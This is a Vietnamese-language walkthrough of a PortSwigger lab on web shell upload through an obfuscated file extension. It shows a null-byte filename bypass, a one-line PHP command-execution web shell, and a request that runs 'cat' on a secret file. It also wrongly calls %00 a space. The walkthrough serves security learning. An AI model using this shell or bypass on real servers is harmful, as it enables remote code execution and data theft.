## 1. Thông tin bài lab
- Tên lab: **Web shell upload via obfuscated file extension**
- Loại lỗ hổng: File upload -> RCE (Remote Code Execution)
- Link bài lab: [Web shell upload via obfuscated file extension](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension)
- **Mục tiêu**: Upload webshell vào thư mục thực thi mã PHP, chiếm quyền điều khiển server và đọc nội dung tệp tin bí mật _**/home/carlos/secret**_
## 2. Phân tích ban đầu
**Chức năng ứng dụng:** 
- Sau khi đăng nhập tài khoản người dùng, người dùng có thể update email, upload ảnh avatar của người dùng.

![img1](./img/lab1/img1.png)

- Sau khi upload, ứng dụng thông báo đã upload thành công và đường dẫn lưu file ảnh upload.

![img2](./img/lab1/img2.png)

**Đặt giả thuyết**
-	Kiểm tra xem liệu ta có thể upload và thực thi một file php bằng cách tạo một file tên _test.php_ với nội dung `<?php phpinfo(); ?>` và upload lên server.
-	Server chỉ cho phép upload file JPG và PNG.

img

img

- Vậy ta có thể upload file để khi lưu trữ, ứng dụng web hiểu đó là một file .jpeg hoặc .png mà khi xử lý file, server lại xử lý như một file .php không?
- Ta thử upload file với một filename đặc biệt **test.php%00.png** với **%00** là mã hóa URL cho ký tự ' '(khoảng trống)

img

 **Kiểm tra giả thuyết**
 - File được upload thành công và có thể thực thi mã PHP.

img
img

## 3. Tiến hành khai thác
- Upload file **shell.test%00.png** để thực hiện đọc tệp tin bí mật với nội dung: `<?php system($_GET['x']) ?>`

img
img

- Truyền tham số *'x'* để đọc nội dung tệp tin bí mật `x=cat%20/home/carlos/secret`

img
